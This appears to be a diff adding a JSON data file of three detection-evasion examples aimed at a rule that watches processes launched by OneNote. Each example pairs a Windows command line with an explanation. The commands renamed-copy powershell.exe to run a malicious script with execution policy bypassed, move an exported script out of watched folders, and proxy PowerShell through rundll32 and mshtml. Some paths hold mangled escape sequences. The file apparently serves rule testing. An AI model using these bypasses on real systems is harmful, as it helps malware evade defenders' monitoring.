@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe %TEMP%\\\not\\_powershell.exe && \"%ProgramFiles%\\Microsoft Office\\\root\\Office16\\ONENOTE.EXE\" /hyperlink \"C:\\path\\\to\\malicious.one\" && %TEMP%\\\not\\_powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\malicious.ps1",
+    "explanation": "The rule relies on 'Image' ending with specific binary names like '\\powershell.exe'. By copying the legitimate executable to a new name (e.g., 'not\\_powershell.exe'), the filename check is bypassed while maintaining the functionality of the script interpreter."
+  },
+  {
+    "output": "cmd.exe /c \"move C:\\Users\\User\\AppData\\Local\\Temp\\OneNote\\16.0\\Exported\\script.ps1 C:\\Users\\Public\\s.ps1 && powershell.exe -File C:\\Users\\Public\\s.ps1\"",
+    "explanation": "The rule specifically looks for the strings '\\exported\\' or '\\onenoteofflinecache\\_files\\' in the CommandLine. If the attacker moves the file out of these specific subdirectories to a generic path (like C:\\Users\\Public\\) before execution, or ensures the command line context does not include the full path of the exported directory, the 'CommandLine|contains' condition fails."
+  },
+  {
+    "output": "C:\\Windows\\System32\\\rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write('\\<script language=\"VBScript\"\\>CreateObject(\"WScript.Shell\").Run(\"powershell.exe\")\\</script\\>')",
+    "explanation": "This bypasses the rule by using an unlisted binary (rundll32.exe) as the immediate child process of OneNote.exe to proxy the execution of the script, as 'rundll32.exe' is not included in the 'Image|endswith' selection list."
+  }
+]
